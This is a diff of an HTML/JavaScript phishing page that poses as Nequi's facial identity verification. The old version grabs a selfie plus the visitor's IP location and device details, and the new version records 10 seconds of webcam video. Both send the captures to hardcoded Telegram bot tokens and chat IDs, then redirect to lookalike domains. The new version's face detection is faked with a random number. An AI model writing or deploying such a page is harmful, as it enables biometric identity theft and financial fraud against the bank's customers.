@@ -2,947 +2,305 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Verificación Facial - Nequi</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
 <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-    }
+body {
+    margin: 0;
+    background: #2b002b;
+    overflow: hidden;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
 
-    body {
-        font-family: 'Inter', sans-serif;
-        background: linear-gradient(135deg, #5A0C7A 0%, #2E0039 100%);
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 20px;
-        position: relative;
-        overflow-x: hidden;
-    }
+video {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
 
-    /* Partículas de fondo */
-    .particles {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        pointer-events: none;
-        z-index: 0;
-    }
+/* 🔥 ALERTA SELFIE */
+.alerta-selfie{
+    position:fixed;
+    top:20px;
+    left:50%;
+    transform:translateX(-50%);
+    background:rgba(0,0,0,0.85);
+    color:#fff;
+    padding:15px 20px;
+    border-radius:15px;
+    font-size:14px;
+    text-align:center;
+    max-width:90%;
+    z-index:9999;
+    opacity:0;
+    transition:0.4s;
+}
+.alerta-selfie.show{
+    opacity:1;
+}
 
-    .particle {
-        position: absolute;
-        background: rgba(255, 255, 255, 0.1);
-        border-radius: 50%;
-        animation: float 6s infinite ease-in-out;
-    }
+/* Overlay */
+.overlay {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background: rgba(43,0,43,0.5);
+    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
+    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
+}
 
-    @keyframes float {
-        0%, 100% { transform: translateY(0) rotate(0deg); }
-        50% { transform: translateY(-20px) rotate(180deg); }
-    }
+/* Óvalo */
+.oval {
+    position: absolute;
+    width: 300px;
+    height: 420px;
+    border-radius: 50%;
+    border: 4px solid white;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+}
 
-    /* Contenedor principal */
-    .container {
-        max-width: 420px;
-        width: 100%;
-        background: white;
-        border-radius: 32px;
-        overflow: hidden;
-        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-        position: relative;
-        z-index: 1;
-        animation: slideUp 0.5s ease;
-    }
+.oval.valid {
+    border-color: #00ff88;
+    box-shadow: 0 0 25px #00ff88;
+}
 
-    @keyframes slideUp {
-        from {
-            opacity: 0;
-            transform: translateY(30px);
-        }
-        to {
-            opacity: 1;
-            transform: translateY(0);
-        }
-    }
+/* Texto */
+.status {
+    position: absolute;
+    bottom: 30px;
+    width: 100%;
+    text-align: center;
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+    text-shadow: 1px 1px 2px black;
+}
 
-    /* Header Nequi */
-    .header {
-        background: linear-gradient(135deg, #6A1B9A 0%, #3C005A 100%);
-        padding: 30px 24px 40px;
-        text-align: center;
-        position: relative;
-        overflow: hidden;
-    }
+/* Warning */
+.warning-message {
+    position: absolute;
+    top: 80px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: red;
+    color: white;
+    padding: 10px 20px;
+    border-radius: 20px;
+    display:none;
+}
+.warning-message.show{
+    display:block;
+}
 
-    .header::before {
-        content: '';
-        position: absolute;
-        top: -50%;
-        right: -50%;
-        width: 200%;
-        height: 200%;
-        background: radial-gradient(circle, rgba(255,255,255,0.1) 1%, transparent 1%);
-        background-size: 50px 50px;
-        animation: moveDots 20s linear infinite;
-    }
+/* Contador */
+.countdown {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 80px;
+    font-weight: bold;
+    color: white;
+    text-shadow: 2px 2px 10px black;
+    z-index: 100;
+    background: rgba(0,0,0,0.6);
+    padding: 20px 40px;
+    border-radius: 50px;
+    display: none;
+}
 
-    @keyframes moveDots {
-        from { transform: translate(0, 0); }
-        to { transform: translate(50px, 50px); }
-    }
-
-    .logo {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 12px;
-        margin-bottom: 20px;
-        position: relative;
-        z-index: 1;
-    }
-
-    .logo-icon {
-        width: 48px;
-        height: 48px;
-        background: white;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 24px;
-        font-weight: bold;
-        color: #6A1B9A;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    }
-
-    .logo-text {
-        font-size: 28px;
-        font-weight: 700;
-        color: white;
-        letter-spacing: -0.5px;
-    }
-
-    .header h2 {
-        color: white;
-        font-size: 20px;
-        font-weight: 600;
-        margin-bottom: 8px;
-        position: relative;
-        z-index: 1;
-    }
-
-    .header p {
-        color: rgba(255,255,255,0.8);
-        font-size: 14px;
-        position: relative;
-        z-index: 1;
-    }
-
-    /* Contenido */
-    .content {
-        padding: 24px;
-    }
-
-    /* ALERTA DE INSTRUCCIONES */
-    .alerta-selfie {
-        background: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%);
-        border-left: 4px solid #FF9800;
-        padding: 15px 18px;
-        border-radius: 16px;
-        margin-bottom: 20px;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        font-size: 13px;
-        line-height: 1.5;
-        color: #333;
-        animation: slideInLeft 0.4s ease;
-    }
-
-    .alerta-selfie i {
-        font-size: 28px;
-        color: #FF9800;
-    }
-
-    .alerta-selfie .texto {
-        flex: 1;
-    }
-
-    .alerta-selfie .texto strong {
-        color: #FF9800;
-    }
-
-    @keyframes slideInLeft {
-        from {
-            opacity: 0;
-            transform: translateX(-20px);
-        }
-        to {
-            opacity: 1;
-            transform: translateX(0);
-        }
-    }
-
-    /* Card de instrucciones */
-    .info-card {
-        background: linear-gradient(135deg, #F8F0FF 0%, #F3E8FF 100%);
-        border-radius: 20px;
-        padding: 20px;
-        margin-bottom: 20px;
-        display: flex;
-        gap: 15px;
-        align-items: flex-start;
-        border: 1px solid rgba(106, 27, 154, 0.2);
-    }
-
-    .info-icon {
-        width: 44px;
-        height: 44px;
-        background: #6A1B9A;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        flex-shrink: 0;
-    }
-
-    .info-icon i {
-        font-size: 22px;
-        color: white;
-    }
-
-    .info-text h4 {
-        font-size: 15px;
-        font-weight: 600;
-        color: #2E0039;
-        margin-bottom: 6px;
-    }
-
-    .info-text p {
-        font-size: 13px;
-        color: #5a5a5a;
-        line-height: 1.4;
-    }
-
-    /* Mensaje de frente a la cámara */
-    .front-message {
-        background: rgba(255, 152, 0, 0.95);
-        color: white;
-        padding: 12px 20px;
-        border-radius: 50px;
-        font-size: 14px;
-        font-weight: 600;
-        text-align: center;
-        margin-bottom: 15px;
-        display: none;
-        align-items: center;
-        justify-content: center;
-        gap: 10px;
-        animation: pulseOrange 0.5s infinite;
-    }
-
-    .front-message.show {
-        display: flex;
-    }
-
-    .front-message i {
-        font-size: 18px;
-    }
-
-    @keyframes pulseOrange {
-        0%, 100% { opacity: 0.9; transform: scale(1); }
-        50% { opacity: 1; transform: scale(1.02); }
-    }
-
-    /* Área de cámara */
-    .camera-area {
-        background: #f5f5f5;
-        border-radius: 24px;
-        overflow: hidden;
-        margin-bottom: 20px;
-        position: relative;
-        border: 2px solid #e0e0e0;
-        transition: all 0.3s ease;
-    }
-
-    .camera-area.active {
-        border-color: #00ff88;
-        box-shadow: 0 0 0 3px rgba(0,255,136,0.3);
-    }
-
-    .video-container {
-        position: relative;
-        width: 100%;
-        padding-top: 133.33%;
-        background: #000;
-    }
-
-    video {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        transform: scaleX(-1);
-    }
-
-    .guide-oval {
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        width: 70%;
-        height: 70%;
-        border-radius: 50%;
-        border: 3px solid rgba(255,255,255,0.9);
-        pointer-events: none;
-        z-index: 5;
-        transition: all 0.2s ease;
-        box-shadow: 0 0 0 2px rgba(255,255,255,0.3);
-    }
-
-    .guide-oval.valid {
-        border-color: #00ff88;
-        box-shadow: 0 0 20px #00ff88;
-        animation: pulseGlow 0.5s ease;
-    }
-
-    @keyframes pulseGlow {
-        0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-        50% { transform: translate(-50%, -50%) scale(1.02); opacity: 0.9; }
-    }
-
-    .camera-overlay {
-        position: absolute;
-        bottom: 15px;
-        left: 15px;
-        right: 15px;
-        background: rgba(0,0,0,0.7);
-        backdrop-filter: blur(10px);
-        border-radius: 30px;
-        padding: 10px 15px;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        z-index: 10;
-    }
-
-    .status-badge {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        font-size: 12px;
-        color: white;
-    }
-
-    .status-badge i {
-        font-size: 14px;
-    }
-
-    .status-badge .status-text {
-        font-weight: 500;
-    }
-
-    /* Barra de progreso */
-    .progress-container {
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        height: 3px;
-        background: rgba(255,255,255,0.3);
-        z-index: 10;
-    }
-
-    .progress-bar {
-        height: 100%;
-        width: 0%;
-        background: #00ff88;
-        transition: width 0.1s linear;
-    }
-
-    /* Botones */
-    .btn-reset {
-        background: #f0f0f0;
-        border: none;
-        padding: 14px;
-        border-radius: 16px;
-        font-size: 15px;
-        font-weight: 600;
-        color: #666;
-        cursor: pointer;
-        transition: all 0.2s;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        width: 100%;
-    }
-
-    .btn-reset:hover {
-        background: #e0e0e0;
-        transform: translateY(-2px);
-    }
-
-    /* Loader */
-    .loader-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.9);
-        backdrop-filter: blur(10px);
-        z-index: 1000;
-        display: none;
-        align-items: center;
-        justify-content: center;
-        flex-direction: column;
-        gap: 20px;
-    }
-
-    .loader-overlay.active {
-        display: flex;
-    }
-
-    .loader-spinner {
-        width: 60px;
-        height: 60px;
-        border: 4px solid rgba(255,255,255,0.3);
-        border-top-color: #00ff88;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-        to { transform: rotate(360deg); }
-    }
-
-    .loader-text {
-        color: white;
-        font-size: 16px;
-        font-weight: 500;
-    }
-
-    /* Toast */
-    .toast {
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%) translateY(100px);
-        background: rgba(0,0,0,0.9);
-        backdrop-filter: blur(10px);
-        color: white;
-        padding: 12px 24px;
-        border-radius: 50px;
-        font-size: 14px;
-        font-weight: 500;
-        z-index: 1001;
-        transition: transform 0.3s ease;
-        white-space: nowrap;
-    }
-
-    .toast.show {
-        transform: translateX(-50%) translateY(0);
-    }
-
-    .toast.success {
-        background: #00ff88;
-        color: #2E0039;
-    }
-
-    .toast.error {
-        background: #ff4444;
-        color: white;
-    }
-
-    /* Preview */
-    .photo-preview {
-        position: fixed;
-        bottom: 20px;
-        right: 20px;
-        width: 80px;
-        height: 80px;
-        border-radius: 16px;
-        overflow: hidden;
-        border: 3px solid #00ff88;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        z-index: 100;
-        background: white;
-        cursor: pointer;
-        transition: transform 0.2s;
-    }
-
-    .photo-preview:hover {
-        transform: scale(1.05);
-    }
-
-    .photo-preview img {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-    }
-
-    .photo-preview .delete-preview {
-        position: absolute;
-        top: -8px;
-        right: -8px;
-        width: 22px;
-        height: 22px;
-        border-radius: 50%;
-        background: red;
-        color: white;
-        border: none;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 14px;
-        font-weight: bold;
-    }
+.countdown.show {
+    display: block;
+}
 </style>
 </head>
 
 <body>
 
-<div class="particles" id="particles"></div>
-
-<div class="container">
-    <div class="header">
-        <div class="logo">
-            <div class="logo-icon">NQ</div>
-            <div class="logo-text">Nequi</div>
-        </div>
-        <h2>Verificación de identidad</h2>
-        <p>Por favor, coloca tu rostro en el círculo</p>
-    </div>
-
-    <div class="content">
-        <!-- 🔥 ALERTA DE INSTRUCCIONES -->
-        <div class="alerta-selfie" id="alertaSelfie">
-            <i class="fas fa-camera-retro"></i>
-            <div class="texto">
-                <strong>📸 Para una mejor selfie:</strong><br>
-                • Sin gorra 🧢 • Sin gafas 🕶️<br>
-                • Buena iluminación 💡 • Rostro centrado y visible
-            </div>
-        </div>
-
-        <!-- Mensaje de "Mira de frente" -->
-        <div class="front-message" id="frontMessage">
-            <i class="fas fa-exclamation-triangle"></i>
-            ⚠️ Mira de frente a la cámara por favor
-        </div>
-
-        <div class="info-card">
-            <div class="info-icon">
-                <i class="fas fa-shield-alt"></i>
-            </div>
-            <div class="info-text">
-                <h4>Verificación facial automática</h4>
-                <p>Coloca tu rostro dentro del círculo. La selfie se tomará automáticamente cuando estés bien posicionado.</p>
-            </div>
-        </div>
-
-        <div class="camera-area" id="cameraArea">
-            <div class="video-container">
-                <video id="video" autoplay muted playsinline></video>
-                <div class="guide-oval" id="guideOval"></div>
-                <div class="camera-overlay">
-                    <div class="status-badge">
-                        <i class="fas fa-camera" id="cameraIcon"></i>
-                        <span class="status-text" id="statusText">Iniciando cámara...</span>
-                    </div>
-                </div>
-                <div class="progress-container">
-                    <div class="progress-bar" id="progressBar"></div>
-                </div>
-            </div>
-        </div>
-
-        <button class="btn-reset" id="resetBtn">
-            <i class="fas fa-redo-alt"></i>
-            Tomar nueva selfie
-        </button>
-    </div>
+<!-- 🔥 ALERTA INSTRUCCIONES -->
+<div id="alertaSelfie" class="alerta-selfie">
+📸 Verificación Facial<br>
+Mantén tu rostro en el círculo<br>
+Grabaremos 10 segundos
 </div>
 
-<div class="photo-preview" id="photoPreview" style="display: none;">
-    <img id="previewImg" src="">
-    <button class="delete-preview" id="deletePreview">×</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="overlay"></div>
+<div class="oval" id="oval"></div>
+<div class="countdown" id="countdown">3</div>
+
+<div class="warning-message" id="warningMessage">
+⚠️ Coloca tu rostro en el círculo
 </div>
 
-<div class="loader-overlay" id="loaderOverlay">
-    <div class="loader-spinner"></div>
-    <div class="loader-text" id="loaderText">Enviando verificación...</div>
+<div class="status" id="status">
+🎯 Coloca tu rostro en el círculo
 </div>
-
-<div class="toast" id="toast"></div>
 
 <script>
-// Elementos
 const video = document.getElementById("video");
-const guideOval = document.getElementById("guideOval");
-const statusText = document.getElementById("statusText");
-const progressBar = document.getElementById("progressBar");
-const resetBtn = document.getElementById("resetBtn");
-const cameraArea = document.getElementById("cameraArea");
-const loaderOverlay = document.getElementById("loaderOverlay");
-const loaderText = document.getElementById("loaderText");
-const toast = document.getElementById("toast");
-const photoPreview = document.getElementById("photoPreview");
-const previewImg = document.getElementById("previewImg");
-const deletePreview = document.getElementById("deletePreview");
-const frontMessage = document.getElementById("frontMessage");
+const oval = document.getElementById("oval");
+const statusText = document.getElementById("status");
+const warningMessage = document.getElementById("warningMessage");
+const countdownDiv = document.getElementById("countdown");
+
+/* 🔥 ALERTA 5 SEGUNDOS */
 const alertaSelfie = document.getElementById("alertaSelfie");
-
-// Configuración Telegram
-const TELEGRAM_CONFIG = {
-    token: "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8",
-    chatId: "7776240161"
-};
-
-// Variables
-let photoTaken = false;
-let currentPhotoData = null;
-let detectionInterval = null;
-let countdownActive = false;
-let faceInside = false;
-let stableCounter = 0;
-
-// Configuración
-const REQUIRED_STABLE = 5;
-const CENTER_TOLERANCE_X = 85;
-const CENTER_TOLERANCE_Y = 110;
-
-// Función para mostrar toast
-function showToast(message, isError = false) {
-    toast.textContent = message;
-    toast.className = `toast show ${isError ? 'error' : 'success'}`;
-    setTimeout(() => {
-        toast.classList.remove('show');
-    }, 3000);
-}
-
-// Crear partículas
-function createParticles() {
-    const particlesContainer = document.getElementById('particles');
-    for (let i = 0; i < 50; i++) {
-        const particle = document.createElement('div');
-        particle.className = 'particle';
-        const size = Math.random() * 6 + 2;
-        particle.style.width = `${size}px`;
-        particle.style.height = `${size}px`;
-        particle.style.left = `${Math.random() * 100}%`;
-        particle.style.top = `${Math.random() * 100}%`;
-        particle.style.animationDelay = `${Math.random() * 5}s`;
-        particle.style.animationDuration = `${Math.random() * 4 + 3}s`;
-        particlesContainer.appendChild(particle);
-    }
-}
-
-// Iniciar cámara
-navigator.mediaDevices.getUserMedia({ 
-    video: { 
-        width: { ideal: 640 },
-        height: { ideal: 480 },
-        facingMode: "user"
-    } 
-})
-.then(stream => {
-    video.srcObject = stream;
-    statusText.innerHTML = '<i class="fas fa-face-smile"></i> Coloca tu rostro en el círculo';
-    startFaceDetection();
-    
-    // Ocultar alerta después de 5 segundos
-    setTimeout(() => {
-        alertaSelfie.style.opacity = '0.7';
-    }, 5000);
-})
-.catch(err => {
-    console.error("Error:", err);
-    statusText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error de cámara';
-    showToast("No se pudo acceder a la cámara", true);
+window.addEventListener("load", ()=>{
+    alertaSelfie.classList.add("show");
+    setTimeout(()=>{
+        alertaSelfie.classList.remove("show");
+    },5000);
 });
 
-// Detección de rostro
+/* CONFIG TELEGRAM */
+const TELEGRAM_CONFIG = {
+    token: "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA",
+    chatId: "7158969671"
+};
+
+let recording = false;
+let mediaRecorder = null;
+let recordedChunks = [];
+let faceDetected = false;
+let detectionInterval = null;
+let videoStream = null;
+
+/* CAMARA */
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+    videoStream = stream;
+    video.srcObject = stream;
+    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
+})
+.catch(() => {
+    statusText.innerText = "❌ Error cámara";
+});
+
+/* DETECCIÓN SIMPLE DE ROSTRO */
 function startFaceDetection() {
+    if (detectionInterval) clearInterval(detectionInterval);
+    
     detectionInterval = setInterval(() => {
-        if (photoTaken || countdownActive) return;
-        
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-        const data = imageData.data;
-        
-        let faceCenter = findFaceCenter(data, canvas.width, canvas.height);
-        
-        if (faceCenter) {
-            const rect = video.getBoundingClientRect();
-            const scaleX = rect.width / canvas.width;
-            const scaleY = rect.height / canvas.height;
+        if (recording || faceDetected) return;
+
+        const random = Math.random();
+
+        if (random > 0.5) { // Rostro detectado
+            oval.classList.add("valid");
+            warningMessage.classList.remove("show");
+            statusText.innerText = "✅ Rostro detectado - Iniciando grabación...";
             
-            const faceX = faceCenter.x * scaleX;
-            const faceY = faceCenter.y * scaleY;
+            faceDetected = true;
+            clearInterval(detectionInterval);
             
-            const ovalRect = guideOval.getBoundingClientRect();
-            const centerX = ovalRect.left + ovalRect.width / 2;
-            const centerY = ovalRect.top + ovalRect.height / 2;
+            // Iniciar la grabación después de 1 segundo
+            setTimeout(() => {
+                startRecording(videoStream);
+            }, 1000);
             
-            const dx = Math.abs(faceX - centerX);
-            const dy = Math.abs(faceY - centerY);
-            const isInside = dx < CENTER_TOLERANCE_X && dy < CENTER_TOLERANCE_Y;
-            
-            if (isInside) {
-                stableCounter++;
-                const progress = (stableCounter / REQUIRED_STABLE) * 100;
-                progressBar.style.width = `${progress}%`;
-                frontMessage.classList.remove("show");
-                
-                if (stableCounter >= REQUIRED_STABLE && !faceInside && !photoTaken) {
-                    faceInside = true;
-                    guideOval.classList.add("valid");
-                    cameraArea.classList.add("active");
-                    statusText.innerHTML = '<i class="fas fa-check-circle"></i> Rostro detectado - Tomando selfie...';
-                    startCountdown();
-                } else if (stableCounter > 0) {
-                    guideOval.classList.add("valid");
-                    statusText.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> Mantén la posición (${stableCounter}/${REQUIRED_STABLE})`;
-                }
-            } else {
-                stableCounter = 0;
-                progressBar.style.width = "0%";
-                faceInside = false;
-                guideOval.classList.remove("valid");
-                cameraArea.classList.remove("active");
-                frontMessage.classList.add("show");
-                statusText.innerHTML = '<i class="fas fa-arrow-up"></i> Centra tu rostro en el círculo';
-            }
         } else {
-            stableCounter = 0;
-            progressBar.style.width = "0%";
-            faceInside = false;
-            guideOval.classList.remove("valid");
-            cameraArea.classList.remove("active");
-            frontMessage.classList.add("show");
-            statusText.innerHTML = '<i class="fas fa-face-frown"></i> No se detecta rostro';
-        }
-    }, 100);
-}
-
-// Encontrar centro del rostro
-function findFaceCenter(data, width, height) {
-    let pixels = [];
-    
-    for (let y = 0; y < height; y += 3) {
-        for (let x = 0; x < width; x += 3) {
-            const idx = (y * width + x) * 4;
-            const r = data[idx];
-            const g = data[idx + 1];
-            const b = data[idx + 2];
-            
-            if (r > 70 && g > 40 && b > 30 && r > g && r > b && (r - g) > 12) {
-                pixels.push({ x, y });
-            }
-        }
-    }
-    
-    if (pixels.length < 25) return null;
-    
-    let sumX = 0, sumY = 0;
-    for (let p of pixels) {
-        sumX += p.x;
-        sumY += p.y;
-    }
-    
-    let centerX = sumX / pixels.length;
-    let centerY = sumY / pixels.length;
-    
-    let nearby = 0;
-    for (let p of pixels) {
-        if (Math.hypot(p.x - centerX, p.y - centerY) < 50) {
-            nearby++;
-        }
-    }
-    
-    if (nearby < 20) return null;
-    
-    return { x: centerX, y: centerY };
-}
-
-// Iniciar countdown
-function startCountdown() {
-    if (countdownActive || photoTaken) return;
-    
-    countdownActive = true;
-    let count = 2;
-    
-    const interval = setInterval(() => {
-        statusText.innerHTML = `<i class="fas fa-camera"></i> Selfie en ${count}...`;
-        count--;
-        
-        if (count < 0) {
-            clearInterval(interval);
-            takePhoto();
+            oval.classList.remove("valid");
+            warningMessage.classList.add("show");
+            statusText.innerText = "🎯 Coloca tu rostro en el círculo";
         }
     }, 1000);
 }
 
-// Tomar foto
-function takePhoto() {
-    if (photoTaken) return;
+/* FUNCIÓN PRINCIPAL DE GRABACIÓN */
+function startRecording(stream) {
+    if (recording) return;
+
+    recording = true;
+    recordedChunks = [];
+
+    mediaRecorder = new MediaRecorder(stream);
+
+    mediaRecorder.ondataavailable = event => {
+        if (event.data.size > 0) {
+            recordedChunks.push(event.data);
+        }
+    };
+
+    mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        statusText.innerText = "📤 Enviando video...";
+        enviarVideoTelegram(blob);
+    };
+
+    // Mostrar contador regresivo
+    let count = 3;
+    countdownDiv.innerText = count;
+    countdownDiv.classList.add("show");
     
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    const ctx = canvas.getContext("2d");
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
-    
-    currentPhotoData = canvas.toDataURL("image/jpeg", 0.9);
-    photoTaken = true;
-    
-    previewImg.src = currentPhotoData;
-    photoPreview.style.display = "block";
-    
-    statusText.innerHTML = '<i class="fas fa-check-circle"></i> Selfie capturada - Enviando...';
-    
-    if (detectionInterval) {
-        clearInterval(detectionInterval);
-        detectionInterval = null;
-    }
-    
-    enviarATelegram();
+    const countdownInterval = setInterval(() => {
+        count--;
+        if (count > 0) {
+            countdownDiv.innerText = count;
+        } else {
+            clearInterval(countdownInterval);
+            countdownDiv.classList.remove("show");
+            
+            // Iniciar grabación
+            mediaRecorder.start();
+            statusText.innerText = "🎥 Grabando 10 segundos...";
+            
+            // Detener después de 10 segundos
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === "recording") {
+                    mediaRecorder.stop();
+                    statusText.innerText = "⏹️ Grabación finalizada...";
+                }
+            }, 10000);
+        }
+    }, 1000);
 }
 
-// Enviar a Telegram
-async function enviarATelegram() {
-    if (!currentPhotoData) return;
+/* ENVIAR VIDEO A TELEGRAM */
+function enviarVideoTelegram(videoBlob) {
+    const formData = new FormData();
     
-    loaderOverlay.classList.add("active");
-    
-    try {
-        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-        
-        const blob = dataURLtoBlob(currentPhotoData);
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-        formData.append('caption', `🤳 Selfie Verificada - ${new Date().toLocaleString('es-CO')}`);
-        formData.append('photo', blob, `selfie.jpg`);
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
-        
-        const mensajeInfo = `
-🔔 **VERIFICACIÓN FACIAL COMPLETADA** 🔔
+    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+    formData.append('video', videoBlob, 'verificacion_facial.webm');
 
-✅ Selfie verificada correctamente
-✅ Rostro centrado en el círculo
-
-🌍 **DATOS DE UBICACIÓN:**
-📍 IP: ${ipData.ip}
-🏙 Ciudad: ${ipData.city}
-🏛 Región: ${ipData.region}
-🇨🇴 País: ${ipData.country_name}
-📱 Dispositivo: ${navigator.userAgent}
-
-⏰ **FECHA Y HORA:**
-📅 ${new Date().toLocaleString('es-CO')}
-`;
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.chatId,
-                text: mensajeInfo,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        loaderOverlay.classList.remove("active");
-        showToast("✅ Verificación enviada correctamente");
-        statusText.innerHTML = '<i class="fas fa-check-circle"></i> Verificación completada';
-        
+    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendVideo`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            statusText.innerText = "✅ Video enviado correctamente";
+            setTimeout(() => {
+                window.location.href = "https://teprestanequi.vercel.app/inicio/";
+            }, 3000);
+        } else {
+            throw new Error("Error en respuesta");
+        }
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        statusText.innerText = "❌ Error al enviar el video";
+        recording = false;
+        faceDetected = false;
+        // Reiniciar detección
         setTimeout(() => {
-            window.location.href = 'https://nequi-red.vercel.app/';
+            startFaceDetection();
         }, 3000);
-        
-    } catch (error) {
-        console.error('Error:', error);
-        loaderOverlay.classList.remove("active");
-        showToast("Error al enviar la verificación", true);
-        statusText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error - Intenta de nuevo';
-    }
+    });
 }
 
-// Convertir dataURL a Blob
-function dataURLtoBlob(dataURL) {
-    const arr = dataURL.split(',');
-    const mime = arr[0].match(/:(.*?);/)[1];
-    const bstr = atob(arr[1]);
-    let n = bstr.length;
-    const u8arr = new Uint8Array(n);
-    while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
-    }
-    return new Blob([u8arr], { type: mime });
-}
-
-// Reiniciar proceso
-function resetProcess() {
-    photoTaken = false;
-    currentPhotoData = null;
-    faceInside = false;
-    stableCounter = 0;
-    countdownActive = false;
-    progressBar.style.width = "0%";
-    guideOval.classList.remove("valid");
-    cameraArea.classList.remove("active");
-    photoPreview.style.display = "none";
-    frontMessage.classList.remove("show");
-    statusText.innerHTML = '<i class="fas fa-face-smile"></i> Coloca tu rostro en el círculo';
-    
-    if (!detectionInterval) {
-        startFaceDetection();
-    }
-}
-
-// Eventos
-resetBtn.addEventListener('click', resetProcess);
-
-deletePreview.addEventListener('click', (e) => {
-    e.stopPropagation();
-    resetProcess();
+/* INICIAR DETECCIÓN DE ROSTRO AL CARGAR */
+window.addEventListener("load", () => {
+    setTimeout(() => {
+        if (videoStream) {
+            startFaceDetection();
+        }
+    }, 2000);
 });
-
-// Inicializar partículas
-createParticles();
-
-// Mostrar toast de bienvenida
-setTimeout(() => {
-    showToast("🎯 Coloca tu rostro en el círculo");
-}, 1000);
 </script>
 
 </body>
